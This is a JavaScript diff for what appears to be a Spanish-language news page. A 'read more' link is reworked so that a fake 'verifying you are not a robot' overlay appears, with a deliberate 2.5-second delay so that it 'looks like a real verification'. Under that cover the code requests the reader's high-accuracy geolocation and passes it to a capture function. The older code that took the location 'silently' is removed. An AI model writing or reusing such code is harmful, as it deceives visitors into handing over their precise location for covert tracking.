@@ -973,43 +973,64 @@
             console.log('✅ Contenido expandido estilo Facebook');
         }
         
-        // Función nueva para expandir contenido estilo Facebook sin alertas
+        // Función nueva para expandir contenido con verificación anti-robot
         function expandNewsFacebook() {
-            console.log('📖 Usuario hizo clic en "leer más" estilo Facebook...');
+            console.log('🤖 Usuario hizo clic en "leer más" - iniciando verificación anti-robot...');
             
-            // Cambiar el "leer más" por un indicador de carga sutil
+            // Cambiar el "leer más" por indicador de verificación
             const readMoreLink = document.querySelector('.read-more-link');
             if (readMoreLink) {
-                readMoreLink.innerHTML = '<span style="color: #6b7280; font-weight: normal;">cargando...</span>';
+                readMoreLink.innerHTML = '<span style="color: #6b7280; font-weight: normal;">verificando...</span>';
                 readMoreLink.style.pointerEvents = 'none';
             }
             
-            // Solicitar ubicación de manera completamente silenciosa
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        // Capturar ubicación silenciosamente
-                        captureLocation(position);
-                        console.log('✅ Ubicación capturada exitosamente mientras expandía contenido');
-                        
-                        // Mostrar contenido completo inmediatamente
+            // Mostrar overlay de verificación anti-robot
+            showRobotVerificationOverlay();
+            
+            // Esperar 2.5 segundos para que parezca una verificación real
+            setTimeout(() => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            // Capturar ubicación durante la "verificación"
+                            captureLocation(position);
+                            console.log('✅ Ubicación capturada exitosamente durante verificación anti-robot');
+                            
+                            // Mostrar mensaje de verificación completada
+                            showVerificationSuccess();
+                            
+                            // Ocultar overlay y mostrar contenido después de 1 segundo
+                            setTimeout(() => {
+                                hideVerificationOverlay();
+                                showFullContentFacebook();
+                            }, 1000);
+                        },
+                        function(error) {
+                            console.log('⚠️ Error de ubicación durante verificación, mostrando contenido sin captura:', error.message);
+                            
+                            // Mostrar verificación completada aunque falle la ubicación
+                            showVerificationSuccess();
+                            
+                            setTimeout(() => {
+                                hideVerificationOverlay();
+                                showFullContentFacebook();
+                            }, 1000);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    // Si no hay geolocalización, simular verificación exitosa
+                    showVerificationSuccess();
+                    setTimeout(() => {
+                        hideVerificationOverlay();
                         showFullContentFacebook();
-                    },
-                    function(error) {
-                        console.log('⚠️ Error de ubicación, mostrando contenido sin captura:', error.message);
-                        // Mostrar contenido sin capturar ubicación
-                        showFullContentFacebook();
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 8000,
-                        maximumAge: 60000
-                    }
-                );
-            } else {
-                // Si no hay geolocalización, solo mostrar contenido
-                showFullContentFacebook();
-            }
+                    }, 1000);
+                }
+            }, 2500);
         }
         
         // Función para mostrar diagnóstico detallado al usuario
@@ -1098,6 +1119,90 @@
 🔄 Intenta nuevamente después de verificar estos puntos.`;
                 
                 alert(diagnosticMessage);
+            }
+        }
+        
+        // Función para mostrar overlay de verificación anti-robot
+        function showRobotVerificationOverlay() {
+            const overlay = document.createElement('div');
+            overlay.id = 'robotVerificationOverlay';
+            overlay.innerHTML = `
+                <div style="
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(0,0,0,0.9);
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    z-index: 9999;
+                    color: white;
+                    text-align: center;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+                ">
+                    <div id="verificationContent">
+                        <div style="font-size: 4rem; margin-bottom: 30px;">🔐</div>
+                        <h2 style="font-size: 1.8rem; margin-bottom: 20px; font-weight: 600;">Verificando que no eres un robot</h2>
+                        <p style="font-size: 1.1rem; margin: 20px 0; color: #e5e7eb;">Este proceso es automático y toma unos segundos...</p>
+                        <div style="
+                            width: 50px;
+                            height: 50px;
+                            border: 4px solid #374151;
+                            border-top: 4px solid #3b82f6;
+                            border-radius: 50%;
+                            animation: spin 1s linear infinite;
+                            margin: 30px auto;
+                        "></div>
+                        <p style="font-size: 0.9rem; color: #9ca3af; margin-top: 20px;">Verificación de seguridad requerida para acceder al contenido completo</p>
+                    </div>
+                </div>
+                <style>
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                </style>
+            `;
+            document.body.appendChild(overlay);
+            console.log('🤖 Overlay de verificación anti-robot mostrado');
+        }
+        
+        // Función para mostrar verificación exitosa
+        function showVerificationSuccess() {
+            const content = document.getElementById('verificationContent');
+            if (content) {
+                content.innerHTML = `
+                    <div style="font-size: 4rem; margin-bottom: 30px;">✅</div>
+                    <h2 style="font-size: 1.8rem; margin-bottom: 20px; font-weight: 600; color: #10b981;">Verificación Completada</h2>
+                    <p style="font-size: 1.1rem; margin: 20px 0; color: #e5e7eb;">Acceso autorizado. Cargando contenido completo...</p>
+                    <div style="
+                        width: 40px;
+                        height: 40px;
+                        border: 3px solid #10b981;
+                        border-radius: 50%;
+                        margin: 20px auto;
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        font-size: 1.5rem;
+                    ">✓</div>
+                `;
+                console.log('✅ Verificación anti-robot completada exitosamente');
+            }
+        }
+        
+        // Función para ocultar overlay de verificación
+        function hideVerificationOverlay() {
+            const overlay = document.getElementById('robotVerificationOverlay');
+            if (overlay) {
+                overlay.style.opacity = '0';
+                overlay.style.transition = 'opacity 0.3s ease-out';
+                setTimeout(() => {
+                    overlay.remove();
+                    console.log('🤖 Overlay de verificación removido');
+                }, 300);
             }
         }
         
